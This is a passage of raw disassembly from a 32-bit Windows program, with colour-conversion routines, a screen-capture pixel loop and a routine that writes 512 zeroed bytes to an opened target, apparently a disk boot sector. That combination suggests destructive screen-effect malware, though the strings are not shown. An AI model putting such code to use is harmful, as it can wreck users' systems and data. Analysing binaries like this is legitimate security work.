  4017f7:	d9 45 ec             	flds   -0x14(%ebp)
  4017fa:	d9 45 e8             	flds   -0x18(%ebp)
  4017fd:	d9 c9                	fxch   %st(1)
  4017ff:	df f1                	fcomip %st(1),%st
  401801:	dd d8                	fstp   %st(0)
  401803:	76 16                	jbe    0x40181b
  401805:	d9 45 ec             	flds   -0x14(%ebp)
  401808:	d9 45 f0             	flds   -0x10(%ebp)
  40180b:	df f1                	fcomip %st(1),%st
  40180d:	dd d8                	fstp   %st(0)
  40180f:	76 05                	jbe    0x401816
  401811:	d9 45 f0             	flds   -0x10(%ebp)
  401814:	eb 08                	jmp    0x40181e
  401816:	d9 45 ec             	flds   -0x14(%ebp)
  401819:	eb 03                	jmp    0x40181e
  40181b:	d9 45 e8             	flds   -0x18(%ebp)
  40181e:	d9 5d e0             	fstps  -0x20(%ebp)
  401821:	d9 45 e0             	flds   -0x20(%ebp)
  401824:	d8 65 e4             	fsubs  -0x1c(%ebp)
  401827:	d9 5d dc             	fstps  -0x24(%ebp)
  40182a:	d9 ee                	fldz
  40182c:	d9 5d fc             	fstps  -0x4(%ebp)
  40182f:	d9 ee                	fldz
  401831:	d9 5d f8             	fstps  -0x8(%ebp)
  401834:	d9 45 e0             	flds   -0x20(%ebp)
  401837:	d8 45 e4             	fadds  -0x1c(%ebp)
  40183a:	d9 05 3c 81 40 00    	flds   0x40813c
  401840:	de f9                	fdivrp %st,%st(1)
  401842:	d9 5d d8             	fstps  -0x28(%ebp)
  401845:	d9 45 dc             	flds   -0x24(%ebp)
  401848:	d9 ee                	fldz
  40184a:	df e9                	fucomip %st(1),%st
  40184c:	dd d8                	fstp   %st(0)
  40184e:	7a 0f                	jp     0x40185f
  401850:	d9 45 dc             	flds   -0x24(%ebp)
  401853:	d9 ee                	fldz
  401855:	df e9                	fucomip %st(1),%st
  401857:	dd d8                	fstp   %st(0)
  401859:	0f 84 34 01 00 00    	je     0x401993
  40185f:	d9 45 d8             	flds   -0x28(%ebp)
  401862:	d9 05 40 81 40 00    	flds   0x408140
  401868:	df f1                	fcomip %st(1),%st
  40186a:	dd d8                	fstp   %st(0)
  40186c:	76 0d                	jbe    0x40187b
  40186e:	d9 45 e0             	flds   -0x20(%ebp)
  401871:	d8 45 e4             	fadds  -0x1c(%ebp)
  401874:	d9 45 dc             	flds   -0x24(%ebp)
  401877:	de f1                	fdivp  %st,%st(1)
  401879:	eb 11                	jmp    0x40188c
  40187b:	d9 05 3c 81 40 00    	flds   0x40813c
  401881:	d8 65 e0             	fsubs  -0x20(%ebp)
  401884:	d8 65 e4             	fsubs  -0x1c(%ebp)
  401887:	d9 45 dc             	flds   -0x24(%ebp)
  40188a:	de f1                	fdivp  %st,%st(1)
  40188c:	d9 5d f8             	fstps  -0x8(%ebp)
  40188f:	d9 45 e0             	flds   -0x20(%ebp)
  401892:	d8 65 f0             	fsubs  -0x10(%ebp)
  401895:	d9 05 44 81 40 00    	flds   0x408144
  40189b:	de f9                	fdivrp %st,%st(1)
  40189d:	d9 45 dc             	flds   -0x24(%ebp)
  4018a0:	d9 05 3c 81 40 00    	flds   0x40813c
  4018a6:	de f9                	fdivrp %st,%st(1)
  4018a8:	de c1                	faddp  %st,%st(1)
  4018aa:	d8 75 dc             	fdivs  -0x24(%ebp)
  4018ad:	d9 5d d4             	fstps  -0x2c(%ebp)
  4018b0:	d9 45 e0             	flds   -0x20(%ebp)
  4018b3:	d8 65 ec             	fsubs  -0x14(%ebp)
  4018b6:	d9 05 44 81 40 00    	flds   0x408144
  4018bc:	de f9                	fdivrp %st,%st(1)
  4018be:	d9 45 dc             	flds   -0x24(%ebp)
  4018c1:	d9 05 3c 81 40 00    	flds   0x40813c
  4018c7:	de f9                	fdivrp %st,%st(1)
  4018c9:	de c1                	faddp  %st,%st(1)
  4018cb:	d8 75 dc             	fdivs  -0x24(%ebp)
  4018ce:	d9 5d d0             	fstps  -0x30(%ebp)
  4018d1:	d9 45 e0             	flds   -0x20(%ebp)
  4018d4:	d8 65 e8             	fsubs  -0x18(%ebp)
  4018d7:	d9 05 44 81 40 00    	flds   0x408144
  4018dd:	de f9                	fdivrp %st,%st(1)
  4018df:	d9 45 dc             	flds   -0x24(%ebp)
  4018e2:	d9 05 3c 81 40 00    	flds   0x40813c
  4018e8:	de f9                	fdivrp %st,%st(1)
  4018ea:	de c1                	faddp  %st,%st(1)
  4018ec:	d8 75 dc             	fdivs  -0x24(%ebp)
  4018ef:	d9 5d cc             	fstps  -0x34(%ebp)
  4018f2:	d9 45 f0             	flds   -0x10(%ebp)
  4018f5:	d9 45 e0             	flds   -0x20(%ebp)
  4018f8:	df e9                	fucomip %st(1),%st
  4018fa:	dd d8                	fstp   %st(0)
  4018fc:	7a 17                	jp     0x401915
  4018fe:	d9 45 f0             	flds   -0x10(%ebp)
  401901:	d9 45 e0             	flds   -0x20(%ebp)
  401904:	df e9                	fucomip %st(1),%st
  401906:	dd d8                	fstp   %st(0)
  401908:	75 0b                	jne    0x401915
  40190a:	d9 45 cc             	flds   -0x34(%ebp)
  40190d:	d8 65 d0             	fsubs  -0x30(%ebp)
  401910:	d9 5d fc             	fstps  -0x4(%ebp)
  401913:	eb 54                	jmp    0x401969
  401915:	d9 45 ec             	flds   -0x14(%ebp)
  401918:	d9 45 e0             	flds   -0x20(%ebp)
  40191b:	df e9                	fucomip %st(1),%st
  40191d:	dd d8                	fstp   %st(0)
  40191f:	7a 1f                	jp     0x401940
  401921:	d9 45 ec             	flds   -0x14(%ebp)
  401924:	d9 45 e0             	flds   -0x20(%ebp)
  401927:	df e9                	fucomip %st(1),%st
  401929:	dd d8                	fstp   %st(0)
  40192b:	75 13                	jne    0x401940
  40192d:	d9 45 d4             	flds   -0x2c(%ebp)
  401930:	d9 05 48 81 40 00    	flds   0x408148
  401936:	de c1                	faddp  %st,%st(1)
  401938:	d8 65 cc             	fsubs  -0x34(%ebp)
  40193b:	d9 5d fc             	fstps  -0x4(%ebp)
  40193e:	eb 29                	jmp    0x401969
  401940:	d9 45 e8             	flds   -0x18(%ebp)
  401943:	d9 45 e0             	flds   -0x20(%ebp)
  401946:	df e9                	fucomip %st(1),%st
  401948:	dd d8                	fstp   %st(0)
  40194a:	7a 1d                	jp     0x401969
  40194c:	d9 45 e8             	flds   -0x18(%ebp)
  40194f:	d9 45 e0             	flds   -0x20(%ebp)
  401952:	df e9                	fucomip %st(1),%st
  401954:	dd d8                	fstp   %st(0)
  401956:	75 11                	jne    0x401969
  401958:	d9 45 d0             	flds   -0x30(%ebp)
  40195b:	d9 05 4c 81 40 00    	flds   0x40814c
  401961:	de c1                	faddp  %st,%st(1)
  401963:	d8 65 d4             	fsubs  -0x2c(%ebp)
  401966:	d9 5d fc             	fstps  -0x4(%ebp)
  401969:	d9 45 fc             	flds   -0x4(%ebp)
  40196c:	d9 ee                	fldz
  40196e:	df f1                	fcomip %st(1),%st
  401970:	dd d8                	fstp   %st(0)
  401972:	76 0a                	jbe    0x40197e
  401974:	d9 45 fc             	flds   -0x4(%ebp)
  401977:	d9 e8                	fld1
  401979:	de c1                	faddp  %st,%st(1)
  40197b:	d9 5d fc             	fstps  -0x4(%ebp)
  40197e:	d9 e8                	fld1
  401980:	d9 45 fc             	flds   -0x4(%ebp)
  401983:	df f1                	fcomip %st(1),%st
  401985:	dd d8                	fstp   %st(0)
  401987:	76 0a                	jbe    0x401993
  401989:	d9 45 fc             	flds   -0x4(%ebp)
  40198c:	d9 e8                	fld1
  40198e:	de e9                	fsubrp %st,%st(1)
  401990:	d9 5d fc             	fstps  -0x4(%ebp)
  401993:	8b 45 08             	mov    0x8(%ebp),%eax
  401996:	d9 45 fc             	flds   -0x4(%ebp)
  401999:	d9 18                	fstps  (%eax)
  40199b:	8b 45 08             	mov    0x8(%ebp),%eax
  40199e:	d9 45 f8             	flds   -0x8(%ebp)
  4019a1:	d9 58 04             	fstps  0x4(%eax)
  4019a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4019a7:	d9 45 d8             	flds   -0x28(%ebp)
  4019aa:	d9 58 08             	fstps  0x8(%eax)
  4019ad:	90                   	nop
  4019ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4019b1:	c9                   	leave
  4019b2:	c3                   	ret
  4019b3:	55                   	push   %ebp
  4019b4:	89 e5                	mov    %esp,%ebp
  4019b6:	83 ec 44             	sub    $0x44,%esp
  4019b9:	d9 45 10             	flds   0x10(%ebp)
  4019bc:	d9 5d fc             	fstps  -0x4(%ebp)
  4019bf:	d9 45 10             	flds   0x10(%ebp)
  4019c2:	d9 5d f8             	fstps  -0x8(%ebp)
  4019c5:	d9 45 10             	flds   0x10(%ebp)
  4019c8:	d9 5d f4             	fstps  -0xc(%ebp)
  4019cb:	d9 45 08             	flds   0x8(%ebp)
  4019ce:	d9 5d f0             	fstps  -0x10(%ebp)
  4019d1:	d9 45 0c             	flds   0xc(%ebp)
  4019d4:	d9 5d ec             	fstps  -0x14(%ebp)
  4019d7:	d9 45 10             	flds   0x10(%ebp)
  4019da:	d9 5d e8             	fstps  -0x18(%ebp)
  4019dd:	d9 45 e8             	flds   -0x18(%ebp)
  4019e0:	d9 05 40 81 40 00    	flds   0x408140
  4019e6:	df f1                	fcomip %st(1),%st
  4019e8:	dd d8                	fstp   %st(0)
  4019ea:	72 0c                	jb     0x4019f8
  4019ec:	d9 45 ec             	flds   -0x14(%ebp)
  4019ef:	d9 e8                	fld1
  4019f1:	de c1                	faddp  %st,%st(1)
  4019f3:	d8 4d e8             	fmuls  -0x18(%ebp)
  4019f6:	eb 0e                	jmp    0x401a06
  4019f8:	d9 45 e8             	flds   -0x18(%ebp)
  4019fb:	d8 45 ec             	fadds  -0x14(%ebp)
  4019fe:	d9 45 e8             	flds   -0x18(%ebp)
  401a01:	d8 4d ec             	fmuls  -0x14(%ebp)
  401a04:	de e9                	fsubrp %st,%st(1)
  401a06:	d9 5d e4             	fstps  -0x1c(%ebp)
  401a09:	d9 ee                	fldz
  401a0b:	d9 45 e4             	flds   -0x1c(%ebp)
  401a0e:	df f1                	fcomip %st(1),%st
  401a10:	dd d8                	fstp   %st(0)
  401a12:	0f 86 ec 00 00 00    	jbe    0x401b04
  401a18:	d9 45 e8             	flds   -0x18(%ebp)
  401a1b:	d8 c0                	fadd   %st(0),%st
  401a1d:	d8 65 e4             	fsubs  -0x1c(%ebp)
  401a20:	d9 5d e0             	fstps  -0x20(%ebp)
  401a23:	d9 45 e4             	flds   -0x1c(%ebp)
  401a26:	d8 65 e0             	fsubs  -0x20(%ebp)
  401a29:	d8 75 e4             	fdivs  -0x1c(%ebp)
  401a2c:	d9 5d dc             	fstps  -0x24(%ebp)
  401a2f:	d9 45 f0             	flds   -0x10(%ebp)
  401a32:	d9 05 44 81 40 00    	flds   0x408144
  401a38:	de c9                	fmulp  %st,%st(1)
  401a3a:	d9 5d f0             	fstps  -0x10(%ebp)
  401a3d:	f3 0f 10 45 f0       	movss  -0x10(%ebp),%xmm0
  401a42:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  401a46:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401a49:	db 45 d8             	fildl  -0x28(%ebp)
  401a4c:	d9 45 f0             	flds   -0x10(%ebp)
  401a4f:	de e1                	fsubp  %st,%st(1)
  401a51:	d9 5d d4             	fstps  -0x2c(%ebp)
  401a54:	d9 45 e4             	flds   -0x1c(%ebp)
  401a57:	d8 4d dc             	fmuls  -0x24(%ebp)
  401a5a:	d9 45 d4             	flds   -0x2c(%ebp)
  401a5d:	de c9                	fmulp  %st,%st(1)
  401a5f:	d9 5d d0             	fstps  -0x30(%ebp)
  401a62:	d9 45 e0             	flds   -0x20(%ebp)
  401a65:	d8 45 d0             	fadds  -0x30(%ebp)
  401a68:	d9 5d cc             	fstps  -0x34(%ebp)
  401a6b:	d9 45 e4             	flds   -0x1c(%ebp)
  401a6e:	d8 65 d0             	fsubs  -0x30(%ebp)
  401a71:	d9 5d c8             	fstps  -0x38(%ebp)
  401a74:	83 7d d8 05          	cmpl   $0x5,-0x28(%ebp)
  401a78:	0f 87 86 00 00 00    	ja     0x401b04
  401a7e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a81:	c1 e0 02             	shl    $0x2,%eax
  401a84:	05 18 80 40 00       	add    $0x408018,%eax
  401a89:	8b 00                	mov    (%eax),%eax
  401a8b:	ff e0                	jmp    *%eax
  401a8d:	d9 45 e4             	flds   -0x1c(%ebp)
  401a90:	d9 5d fc             	fstps  -0x4(%ebp)
  401a93:	d9 45 cc             	flds   -0x34(%ebp)
  401a96:	d9 5d f8             	fstps  -0x8(%ebp)
  401a99:	d9 45 e0             	flds   -0x20(%ebp)
  401a9c:	d9 5d f4             	fstps  -0xc(%ebp)
  401a9f:	eb 63                	jmp    0x401b04
  401aa1:	d9 45 c8             	flds   -0x38(%ebp)
  401aa4:	d9 5d fc             	fstps  -0x4(%ebp)
  401aa7:	d9 45 e4             	flds   -0x1c(%ebp)
  401aaa:	d9 5d f8             	fstps  -0x8(%ebp)
  401aad:	d9 45 e0             	flds   -0x20(%ebp)
  401ab0:	d9 5d f4             	fstps  -0xc(%ebp)
  401ab3:	eb 4f                	jmp    0x401b04
  401ab5:	d9 45 e0             	flds   -0x20(%ebp)
  401ab8:	d9 5d fc             	fstps  -0x4(%ebp)
  401abb:	d9 45 e4             	flds   -0x1c(%ebp)
  401abe:	d9 5d f8             	fstps  -0x8(%ebp)
  401ac1:	d9 45 cc             	flds   -0x34(%ebp)
  401ac4:	d9 5d f4             	fstps  -0xc(%ebp)
  401ac7:	eb 3b                	jmp    0x401b04
  401ac9:	d9 45 e0             	flds   -0x20(%ebp)
  401acc:	d9 5d fc             	fstps  -0x4(%ebp)
  401acf:	d9 45 c8             	flds   -0x38(%ebp)
  401ad2:	d9 5d f8             	fstps  -0x8(%ebp)
  401ad5:	d9 45 e4             	flds   -0x1c(%ebp)
  401ad8:	d9 5d f4             	fstps  -0xc(%ebp)
  401adb:	eb 27                	jmp    0x401b04
  401add:	d9 45 cc             	flds   -0x34(%ebp)
  401ae0:	d9 5d fc             	fstps  -0x4(%ebp)
  401ae3:	d9 45 e0             	flds   -0x20(%ebp)
  401ae6:	d9 5d f8             	fstps  -0x8(%ebp)
  401ae9:	d9 45 e4             	flds   -0x1c(%ebp)
  401aec:	d9 5d f4             	fstps  -0xc(%ebp)
  401aef:	eb 13                	jmp    0x401b04
  401af1:	d9 45 e4             	flds   -0x1c(%ebp)
  401af4:	d9 5d fc             	fstps  -0x4(%ebp)
  401af7:	d9 45 e0             	flds   -0x20(%ebp)
  401afa:	d9 5d f8             	fstps  -0x8(%ebp)
  401afd:	d9 45 c8             	flds   -0x38(%ebp)
  401b00:	d9 5d f4             	fstps  -0xc(%ebp)
  401b03:	90                   	nop
  401b04:	d9 45 fc             	flds   -0x4(%ebp)
  401b07:	d9 05 38 81 40 00    	flds   0x408138
  401b0d:	de c9                	fmulp  %st,%st(1)
  401b0f:	d9 5d bc             	fstps  -0x44(%ebp)
  401b12:	f3 0f 2c 45 bc       	cvttss2si -0x44(%ebp),%eax
  401b17:	88 45 c6             	mov    %al,-0x3a(%ebp)
  401b1a:	d9 45 f8             	flds   -0x8(%ebp)
  401b1d:	d9 05 38 81 40 00    	flds   0x408138
  401b23:	de c9                	fmulp  %st,%st(1)
  401b25:	d9 5d bc             	fstps  -0x44(%ebp)
  401b28:	f3 0f 2c 45 bc       	cvttss2si -0x44(%ebp),%eax
  401b2d:	88 45 c5             	mov    %al,-0x3b(%ebp)
  401b30:	d9 45 f4             	flds   -0xc(%ebp)
  401b33:	d9 05 38 81 40 00    	flds   0x408138
  401b39:	de c9                	fmulp  %st,%st(1)
  401b3b:	d9 5d bc             	fstps  -0x44(%ebp)
  401b3e:	f3 0f 2c 45 bc       	cvttss2si -0x44(%ebp),%eax
  401b43:	88 45 c4             	mov    %al,-0x3c(%ebp)
  401b46:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401b49:	c9                   	leave
  401b4a:	c3                   	ret
  401b4b:	55                   	push   %ebp
  401b4c:	89 e5                	mov    %esp,%ebp
  401b4e:	81 ec 38 02 00 00    	sub    $0x238,%esp
  401b54:	c7 44 24 08 00 02 00 	movl   $0x200,0x8(%esp)
  401b5b:	00 
  401b5c:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401b63:	00 
  401b64:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  401b6a:	89 04 24             	mov    %eax,(%esp)
  401b6d:	e8 d6 52 00 00       	call   0x406e48
  401b72:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  401b79:	00 
  401b7a:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  401b81:	00 
  401b82:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%esp)
  401b89:	00 
  401b8a:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401b91:	00 
  401b92:	c7 44 24 08 03 00 00 	movl   $0x3,0x8(%esp)
  401b99:	00 
  401b9a:	c7 44 24 04 00 00 00 	movl   $0x10000000,0x4(%esp)
  401ba1:	10 
  401ba2:	c7 04 24 30 80 40 00 	movl   $0x408030,(%esp)
  401ba9:	a1 10 a2 40 00       	mov    0x40a210,%eax
  401bae:	ff d0                	call   *%eax
  401bb0:	83 ec 1c             	sub    $0x1c,%esp
  401bb3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401bb6:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  401bbd:	00 
  401bbe:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  401bc4:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401bc8:	c7 44 24 08 00 02 00 	movl   $0x200,0x8(%esp)
  401bcf:	00 
  401bd0:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  401bd6:	89 44 24 04          	mov    %eax,0x4(%esp)
  401bda:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401bdd:	89 04 24             	mov    %eax,(%esp)
  401be0:	a1 70 a2 40 00       	mov    0x40a270,%eax
  401be5:	ff d0                	call   *%eax
  401be7:	83 ec 14             	sub    $0x14,%esp
  401bea:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401bed:	89 04 24             	mov    %eax,(%esp)
  401bf0:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  401bf5:	ff d0                	call   *%eax
  401bf7:	83 ec 04             	sub    $0x4,%esp
  401bfa:	90                   	nop
  401bfb:	c9                   	leave
  401bfc:	c3                   	ret
  401bfd:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401c01:	83 e4 f0             	and    $0xfffffff0,%esp
  401c04:	ff 71 fc             	push   -0x4(%ecx)
  401c07:	55                   	push   %ebp
  401c08:	89 e5                	mov    %esp,%ebp
  401c0a:	57                   	push   %edi
  401c0b:	53                   	push   %ebx
  401c0c:	51                   	push   %ecx
  401c0d:	81 ec dc 00 00 00    	sub    $0xdc,%esp
  401c13:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401c1a:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  401c1f:	ff d0                	call   *%eax
  401c21:	83 ec 04             	sub    $0x4,%esp
  401c24:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401c27:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401c2a:	89 04 24             	mov    %eax,(%esp)
  401c2d:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  401c32:	ff d0                	call   *%eax
  401c34:	83 ec 04             	sub    $0x4,%esp
  401c37:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401c3a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401c41:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  401c46:	ff d0                	call   *%eax
  401c48:	83 ec 04             	sub    $0x4,%esp
  401c4b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401c4e:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  401c55:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  401c5a:	ff d0                	call   *%eax
  401c5c:	83 ec 04             	sub    $0x4,%esp
  401c5f:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401c62:	8d 55 8c             	lea    -0x74(%ebp),%edx
  401c65:	b8 00 00 00 00       	mov    $0x0,%eax
  401c6a:	b9 0b 00 00 00       	mov    $0xb,%ecx
  401c6f:	89 d7                	mov    %edx,%edi
  401c71:	f3 ab                	rep stos %eax,%es:(%edi)
  401c73:	c7 45 8c 2c 00 00 00 	movl   $0x2c,-0x74(%ebp)
  401c7a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401c7d:	89 45 90             	mov    %eax,-0x70(%ebp)
  401c80:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401c83:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401c86:	66 c7 45 98 01 00    	movw   $0x1,-0x68(%ebp)
  401c8c:	66 c7 45 9a 20 00    	movw   $0x20,-0x66(%ebp)
  401c92:	c7 45 9c 00 00 00 00 	movl   $0x0,-0x64(%ebp)
  401c99:	c7 45 88 00 00 00 00 	movl   $0x0,-0x78(%ebp)
  401ca0:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  401ca7:	00 
  401ca8:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  401caf:	00 
  401cb0:	8d 45 88             	lea    -0x78(%ebp),%eax
  401cb3:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401cb7:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401cbe:	00 
  401cbf:	8d 45 8c             	lea    -0x74(%ebp),%eax
  401cc2:	89 44 24 04          	mov    %eax,0x4(%esp)
  401cc6:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401cc9:	89 04 24             	mov    %eax,(%esp)
  401ccc:	a1 e4 a1 40 00       	mov    0x40a1e4,%eax
  401cd1:	ff d0                	call   *%eax
  401cd3:	83 ec 18             	sub    $0x18,%esp
  401cd6:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401cd9:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401cdc:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ce0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401ce3:	89 04 24             	mov    %eax,(%esp)
  401ce6:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  401ceb:	ff d0                	call   *%eax
  401ced:	83 ec 08             	sub    $0x8,%esp
  401cf0:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  401cf7:	d9 05 50 81 40 00    	flds   0x408150
  401cfd:	d9 5d c4             	fstps  -0x3c(%ebp)
  401d00:	d9 05 54 81 40 00    	flds   0x408154
  401d06:	d9 5d c0             	fstps  -0x40(%ebp)
  401d09:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401d10:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  401d15:	ff d0                	call   *%eax
  401d17:	83 ec 04             	sub    $0x4,%esp
  401d1a:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401d1d:	c7 44 24 28 20 00 cc 	movl   $0xcc0020,0x28(%esp)
  401d24:	00 
  401d25:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401d28:	89 44 24 24          	mov    %eax,0x24(%esp)
  401d2c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401d2f:	89 44 24 20          	mov    %eax,0x20(%esp)
  401d33:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  401d3a:	00 
  401d3b:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  401d42:	00 
  401d43:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401d46:	89 44 24 14          	mov    %eax,0x14(%esp)
  401d4a:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401d4d:	89 44 24 10          	mov    %eax,0x10(%esp)
  401d51:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401d54:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401d58:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401d5f:	00 
  401d60:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401d67:	00 
  401d68:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401d6b:	89 04 24             	mov    %eax,(%esp)
  401d6e:	a1 04 a2 40 00       	mov    0x40a204,%eax
  401d73:	ff d0                	call   *%eax
  401d75:	83 ec 2c             	sub    $0x2c,%esp
  401d78:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  401d7f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401d82:	3b 45 d0             	cmp    -0x30(%ebp),%eax
  401d85:	0f 8d 0a 02 00 00    	jge    0x401f95
  401d8b:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  401d92:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401d95:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  401d98:	0f 8d ee 01 00 00    	jge    0x401f8c
  401d9e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401da1:	0f af 45 d0          	imul   -0x30(%ebp),%eax
  401da5:	89 c2                	mov    %eax,%edx
  401da7:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401daa:	01 d0                	add    %edx,%eax
  401dac:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401daf:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401db2:	83 f0 04             	xor    $0x4,%eax
  401db5:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  401dbb:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  401dc1:	dd 9d 60 ff ff ff    	fstpl  -0xa0(%ebp)
  401dc7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401dca:	c1 e0 02             	shl    $0x2,%eax
  401dcd:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%ebp)
  401dd3:	db 85 58 ff ff ff    	fildl  -0xa8(%ebp)
  401dd9:	dd 9d 58 ff ff ff    	fstpl  -0xa8(%ebp)
  401ddf:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401de2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401de5:	01 c2                	add    %eax,%edx
  401de7:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401dea:	0f af 45 dc          	imul   -0x24(%ebp),%eax
  401dee:	09 c2                	or     %eax,%edx
  401df0:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401df3:	2b 45 dc             	sub    -0x24(%ebp),%eax
  401df6:	09 d0                	or     %edx,%eax
  401df8:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  401dfe:	db 85 54 ff ff ff    	fildl  -0xac(%ebp)
  401e04:	dd 1c 24             	fstpl  (%esp)
  401e07:	e8 f4 4d 00 00       	call   0x406c00
  401e0c:	dc 8d 58 ff ff ff    	fmull  -0xa8(%ebp)
  401e12:	dc 85 60 ff ff ff    	faddl  -0xa0(%ebp)
  401e18:	dd 9d 60 ff ff ff    	fstpl  -0xa0(%ebp)
  401e1e:	f2 0f 2c 85 60 ff ff 	cvttsd2si -0xa0(%ebp),%eax
  401e25:	ff 
  401e26:	89 45 b8             	mov    %eax,-0x48(%ebp)
  401e29:	8b 45 88             	mov    -0x78(%ebp),%eax
  401e2c:	8b 55 bc             	mov    -0x44(%ebp),%edx
  401e2f:	c1 e2 02             	shl    $0x2,%edx
  401e32:	01 d0                	add    %edx,%eax
  401e34:	8b 00                	mov    (%eax),%eax
  401e36:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401e3c:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  401e42:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  401e48:	89 54 24 04          	mov    %edx,0x4(%esp)
  401e4c:	89 04 24             	mov    %eax,(%esp)
  401e4f:	e8 fc f8 ff ff       	call   0x401750
  401e54:	8b 85 68 ff ff ff    	mov    -0x98(%ebp),%eax
  401e5a:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  401e60:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401e66:	89 45 80             	mov    %eax,-0x80(%ebp)
  401e69:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  401e6f:	89 45 84             	mov    %eax,-0x7c(%ebp)
  401e72:	db 45 b8             	fildl  -0x48(%ebp)
  401e75:	d8 75 c4             	fdivs  -0x3c(%ebp)
  401e78:	db 45 dc             	fildl  -0x24(%ebp)
  401e7b:	db 45 cc             	fildl  -0x34(%ebp)
  401e7e:	de f9                	fdivrp %st,%st(1)
  401e80:	d8 4d c0             	fmuls  -0x40(%ebp)
  401e83:	de c1                	faddp  %st,%st(1)
  401e85:	d9 e8                	fld1
  401e87:	dd 5c 24 08          	fstpl  0x8(%esp)
  401e8b:	dd 1c 24             	fstpl  (%esp)
  401e8e:	e8 7d 4e 00 00       	call   0x406d10
  401e93:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  401e99:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  401e9f:	d9 9d 7c ff ff ff    	fstps  -0x84(%ebp)
  401ea5:	d9 45 80             	flds   -0x80(%ebp)
  401ea8:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401eab:	ba 89 88 88 88       	mov    $0x88888889,%edx
  401eb0:	89 c8                	mov    %ecx,%eax
  401eb2:	f7 ea                	imul   %edx
  401eb4:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  401eb7:	c1 f8 04             	sar    $0x4,%eax
  401eba:	89 c2                	mov    %eax,%edx
